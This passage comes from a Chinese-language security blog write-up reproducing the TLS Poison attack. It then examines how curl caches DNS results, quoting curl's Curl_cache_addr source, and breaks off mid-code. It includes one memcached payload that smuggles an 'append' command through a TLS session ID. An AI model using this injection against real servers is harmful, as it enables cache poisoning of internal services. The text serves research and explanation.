src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part2/7.png" alt></p><p>&#x867D;&#x7136;&#x6211;&#x4EEC;&#x53EA;&#x80FD;&#x4F7F;&#x7528; 32 &#x5B57;&#x8282;&#x7684; Session ID &#xFF0C;&#x4F46;&#x662F;&#x5BF9;&#x4E8E; memcahed &#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>append</code>&#x547D;&#x4EE4;&#x8FDB;&#x884C;&#x8FFD;&#x52A0;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;<code>set payload &quot;\nappend foo 0 0 11\nSo so poor.\r\n&quot;</code>&#x3002;&#x5E76;&#x4E14;&#x56E0;&#x4E3A;&#x6211;&#x4EEC;&#x6CE8;&#x91CA;&#x4E86;&#x90A3;&#x4E24;&#x884C;&#xFF0C;&#x6240;&#x4EE5;&#x5BF9;&#x4E8E;&#x91CD;&#x65B0;&#x8BBE;&#x7F6E;&#x4E86;&#x7684; payload &#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x91CD;&#x65B0;&#x542F;&#x52A8;&#x4E00;&#x6B21; TLS Server </p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part2/8.png" alt></p><p>&#x597D;&#x4E86;&#xFF0C;&#x4EE5;&#x4E0A;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x5173;&#x4E8E; TLS Poison &#x6F0F;&#x6D1E;&#x590D;&#x73B0;&#x7684;&#x90E8;&#x5206;&#x3002;</p><h3 id="Attack-Impact"><a href="#Attack-Impact" class="headerlink" title="Attack Impact"></a>Attack Impact</h3><p>&#x5728;&#x4F5C;&#x8005;&#x7684;&#x62A5;&#x544A;&#x4E2D;&#x6307;&#x51FA;&#x5982;&#x4E0B;&#x7684; Client &#x5BF9; TLS &#x4F1A;&#x8BDD;&#x8FDB;&#x884C;&#x4E86;&#x7F13;&#x5B58;&#xFF1A;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part2/9.jpg" alt></p><p>&#x4F5C;&#x8005;&#x8FD8;&#x7ED9;&#x51FA;&#x4E86;&#x5728;&#x5185;&#x7F51;&#x4E2D;&#x6613;&#x53D7;&#x653B;&#x51FB;&#x7684;&#x670D;&#x52A1;&#xFF1A;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part2/10.jpg" alt></p><h2 id="More-Than-TLS-Poison"><a href="#More-Than-TLS-Poison" class="headerlink" title="More Than TLS Poison"></a>More Than TLS Poison</h2><p>&#x63A5;&#x4E0B;&#x6765;&#x5C31;&#x662F;&#x5728;&#x590D;&#x73B0;&#x3001;&#x63A2;&#x7D22; TLS Poison &#x653B;&#x51FB;&#x9047;&#x5230;&#x7684;&#x4E00;&#x4E9B;&#x95EE;&#x9898;&#x4EE5;&#x53CA;&#x76F8;&#x5E94;&#x7684;&#x63A2;&#x7D22;&#xFF0C;&#x6211;&#x89C9;&#x5F97;&#x5176;&#x4E2D;&#x6709;&#x4E00;&#x4E9B;&#x4F1A;&#x6BD4;&#x653B;&#x51FB;&#x672C;&#x8EAB;&#x66F4;&#x503C;&#x5F97;&#x63A2;&#x7A76;&#x3002;</p><h3 id="cURL-DNS-Cache"><a href="#cURL-DNS-Cache" class="headerlink" title="cURL DNS Cache"></a>cURL DNS Cache</h3><p>&#x5173;&#x4E8E; curl &#x5B58;&#x5728; DNS &#x7F13;&#x5B58;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x5F53;&#x65F6;&#x590D;&#x73B0;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5373;&#x4F7F;&#x6211;&#x4EEC;&#x5DF2;&#x7ECF;&#x8BBE;&#x7F6E;&#x4E86; DNS &#x8BB0;&#x5F55; TTL &#x4E3A; 0 &#xFF0C; curl &#x4E5F;&#x4F1A;&#x6709;&#x4E00;&#x5B9A;&#x65F6;&#x95F4;&#x7684;&#x7F13;&#x5B58;&#xFF0C;&#x8FD9;&#x8BA9;&#x6211;&#x5F53;&#x65F6;&#x611F;&#x5230;&#x975E;&#x5E38;&#x8BE7;&#x5F02;&#xFF0C;&#x7279;&#x522B;&#x60F3;&#x4E86;&#x89E3; curl &#x5BF9;&#x4E8E; DNS &#x7F13;&#x5B58;&#x7684;&#x5904;&#x7406;&#x3002;</p><p>&#x4E8E;&#x662F;&#x4E4E;&#xFF0C;&#x76F4;&#x63A5; build &#x4E86;&#x5F53;&#x65F6;&#x6700;&#x65B0;&#x7684; curl 7.75.0 &#xFF0C;&#x6284;&#x8D77; gdb &#x5C31;&#x5F00;&#x59CB;&#x4E00;&#x987F; debug &#xFF0C;&#x4E00;&#x5F00;&#x59CB;&#x6211;&#x8DDF;&#x4E00;&#x4F4D; C &#x8BED;&#x8A00;&#x5BA1;&#x8BA1;&#x5E26;&#x5E08;&#x8C03;&#x7684;&#x65F6;&#x5019;&#x89C9;&#x5F97; curl &#x7684;&#x4EE3;&#x7801;&#x5E94;&#x8BE5;&#x4F1A;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#x2026;&#x53EF;&#x8C01;&#x77E5;&#x5F04;&#x8D77;&#x6765;&#x8FD8;&#x6BD4;&#x8F83;&#x9EBB;&#x70E6;&#xFF0C;&#x5C24;&#x5176;&#x662F;&#x5BF9;&#x4E8E;&#x6211;&#x8FD9;&#x79CD;&#x4E0D;&#x662F;&#x7279;&#x522B;&#x719F;&#x6089; C &#x8BED;&#x8A00;&#x7684; Web &#x9009;&#x624B;&#x6765;&#x8BF4;&#xFF0C;&#x8C03;&#x8BD5;&#x5751;&#x8FD8;&#x662F;&#x633A;&#x591A;&#x7684;&#xFF0C;&#x5C24;&#x5176; curl &#x8FD8;&#x4F7F;&#x7528;&#x4E86;&#x591A;&#x7EBF;&#x7A0B;&#x5904;&#x7406;&#x2026;&#x6211;&#x5728;&#x8C03;&#x8BD5;&#x7684;&#x65F6;&#x5019;&#x8FD8;&#x662F;&#x76F8;&#x5F53;&#x61F5;&#x903C;&#x7684;&#xFF0C;&#x671F;&#x95F4;&#x4E5F;&#x8BA9;&#x6211;&#x5B66;&#x4E60;&#x5230;&#x4E86;&#x5F88;&#x591A;&#x8C03;&#x8BD5;&#x5C0F;&#x6280;&#x5DE7;&#x3002;</p><p>curl &#x5728; lib/hostip.c#575 &#x5F53;&#x4E2D;&#x4F1A;&#x8C03;&#x7528;<code>Curl_resolv</code>&#x51FD;&#x6570;&#xFF0C;&#x5176;&#x4E2D;&#x53C8;&#x4F1A;&#x8C03;&#x7528;<code>Curl_getaddrinfo</code>&#x51FD;&#x6570;&#x542F;&#x52A8;&#x4E00;&#x4E2A;&#x65B0;&#x7EBF;&#x7A0B;&#x53BB;&#x67E5;&#x8BE2; DNS &#xFF0C;&#x5176;&#x4E2D;&#x4E3B;&#x8981;&#x4F7F;&#x7528;&#x4E86;<code>Curl_getaddrinfo_ex</code>&#x5C01;&#x88C5;&#x4E86;<code>getaddrinfo</code>&#x8FD9;&#x4E2A; libc &#x51FD;&#x6570;&#xFF0C;&#x5F97;&#x5230;&#x7684;&#x7ED3;&#x679C;&#x4F1A;&#x4F7F;&#x7528;<code>Curl_cache_addr</code>&#x8FDB;&#x884C;&#x7F13;&#x5B58;&#xFF0C;&#x800C;&#x8FDB;&#x884C;&#x7F13;&#x5B58;&#x4E3B;&#x8981;&#x64CD;&#x4F5C;&#x5C31;&#x662F; curl &#x81EA;&#x5DF1;&#x7EF4;&#x62A4;&#x4E86;&#x4E00;&#x4E2A;&#x54C8;&#x5E0C;&#x8868;&#xFF0C;&#x7B2C;&#x4E00;&#x6B21;&#x67E5;&#x8BE2;&#x5F97;&#x5230;&#x7ED3;&#x679C;&#x5C31;&#x4F1A;&#x4F7F;&#x7528;<code>Curl_cache_addr</code>&#x653E;&#x5165;&#x54C8;&#x5E0C;&#x8868;&#x5F53;&#x4E2D;&#xFF0C;&#x4E3B;&#x8981;&#x51FD;&#x6570;&#x5B9E;&#x73B0;&#x5982;&#x4E0B;&#xFF1A; </p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment"> * Curl_cache_addr() stores a &apos;Curl_addrinfo&apos; struct in the DNS cache.</span></span><br><span class="line"><span class="hljs-comment"> *</span></span><br><span class="line"><span class="hljs-comment"> * When calling Curl_resolv() has resulted in a response with a returned</span></span><br><span class="line"><span class="hljs-comment"> * address, we call this function to store the information in the dns</span></span><br><span class="line"><span class="hljs-comment"> * cache etc</span></span><br><span class="line"><span class="hljs-comment"> *</span></span><br><span class="line"><span class="hljs-comment"> * Returns the Curl_dns_entry entry pointer or NULL if the storage failed.</span></span><br><span class="line"><span class="hljs-comment"> */</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Curl_dns_entry</span> *</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-title">Curl_cache_addr</span>(<span class="hljs-title">struct</span> <span class="hljs-title">Curl_easy</span> *<span class="hljs-title">data</span>,</span></span><br><span class="line"><span class="hljs-class">                <span class="hljs-title">struct</span> <span class="hljs-title">Curl_addrinfo</span> *<span class="hljs-title">addr</span>,</span></span><br><span class="line"><span class="hljs-class">                <span class="hljs-title">const</span> <span class="hljs-title">char</span> *<span class="hljs-title">hostname</span>,</span></span><br><span class="line"><span class="hljs-class">                <span class="hljs-title">int</span> <span class="hljs-title">port</span>)</span></span><br><span class="line"><span class="hljs-class">{</span></span><br><span class="line">  <span class="hljs-keyword">char</span> entry_id[MAX_HOSTCACHE_LEN];</span><br><span class="line">  <span class="hljs-keyword">size_t</span> entry_len;</span><br><span class="line">  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Curl_dns_entry</span> *<span class="hljs-title">dns</span>;</span></span><br><span class="line">  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Curl_dns_entry</span> *<span class="hljs-title">dns2</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> CURL_DISABLE_SHUFFLE_DNS</span></span><br><span class="line">  <span class="hljs-comment">/* shuffle addresses if requested */</span></span><br><span class="line">  <span class="hljs-keyword">if</span>(data-&gt;<span class="hljs-built_in">set</span>.dns_shuffle_addresses) {</span><br><span class="line">    CURLcode result = Curl_shuffle_addr(data, &amp;addr);</span><br><span class="line">    <span class="hljs-keyword">if</span>(result)</span><br><span class="line">      <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;</span><br><span class="line">  }</span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-comment">/* Create a new cache entry */</span></span><br><span class="line">  dns = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-keyword">sizeof</span>(struct Curl_dns_entry));</span><br><span class="line">  <span class="hljs-keyword">if</span>(!dns) {</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="hljs-comment">/* Create an entry id, based upon the hostname and port */</span></span><br><span class="line">  create_hostcache_id(hostname, port, entry_id, <span class="hljs-keyword">sizeof</span>(entry_id));</span><br><span class="line">  entry_len = <span class="hljs-built_in">strlen</span>(entry_id);</span><br><span class="line"></span><br><span class="line">  dns-&gt;inuse = <span class="hljs-number">1</span>;   <span class="hljs-comment">/* the cache has the first reference */</span></span><br><span class="line">  dns-&gt;addr = addr; <span class="hljs-comment">/* this is the address(es) */</span></span><br><span class="line">  time(&amp;dns-&gt;timestamp);</span><br><span class="line">  <span class="hljs-keyword">if</span>(dns-&gt;timestamp == <span class="hljs-number">0</span>)</span><br><span class="line">    dns-&gt;timestamp = <span class="hljs-number">1</span>;   <span class="hljs-comment">/* zero indicates permanent CURLOPT_RESOLVE entry */</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-comment">/* Store the resolved data in our DNS cache. */</span></span><br><span class="line">  dns2 = Curl_hash_add(data-&gt;dns.hostcache, entry_id, entry_len + <span 